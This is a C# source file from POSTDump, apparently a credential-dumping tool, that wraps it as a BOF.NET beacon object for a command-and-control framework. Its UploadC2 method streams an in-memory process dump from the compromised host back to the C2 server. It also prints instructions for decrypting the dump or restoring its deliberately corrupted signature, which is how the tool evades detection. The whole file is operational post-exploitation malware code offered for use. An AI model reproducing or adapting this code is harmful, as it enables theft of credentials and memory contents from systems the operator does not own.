using System;
using System.IO;
//using System.Threading.Tasks;
using BOFNET;

namespace POSTDump
{
    public class BOFNET : BeaconObject
    {
        public BOFNET(BeaconApi api) : base(api) { }

        public volatile static BOFNET bofnet = null;

        public override void Go(string[] args)
        {
            try
            {
                bofnet = this;
                // Run main program passing original arguments
                //Task.Run(() => Postdump.Main(args)).GetAwaiter().GetResult();
                Postdump.Main(args);
            }
            catch (Exception ex)
            {
                BeaconConsole.WriteLine(String.Format("\nBOF.NET Exception: {0}.", ex));
            }
        }

        private static IntPtr RVA(IntPtr baseaddr, long rva)
        {
            return new IntPtr(baseaddr.ToInt64() + (long)rva);
        }

        public unsafe void UploadC2(string filename, IntPtr baseaddr, long size, bool Encrypt, bool Signature)
        {
            BeaconConsole.WriteLine($"[+] Dump successfull! Starting download..");
            try
            {
                UnmanagedMemoryStream ms = new UnmanagedMemoryStream((byte*)baseaddr.ToPointer(), size);
                ms.Position = 0;
                DownloadFile(filename, ms);
                ms.Close();
                BeaconConsole.WriteLine($"[+] {filename} file downloaded!");
                if (Encrypt)
                {
                    BeaconConsole.WriteLine($"The dump is encrypted, to restore it run:\npython3 dump-restore.py {filename} --type decrypt");
                }
                else if (Signature)
                {
                    BeaconConsole.WriteLine($"The dump has an invalid signature, to restore it run:\npython3 dump-restore.py {filename} --type restore");
                }

            }
            catch (Exception ex)
            {
                BeaconConsole.WriteLine(String.Format("[!] BOF.NET Exception during DownloadFile(): {0}.", ex));
            }
        }
    }
}
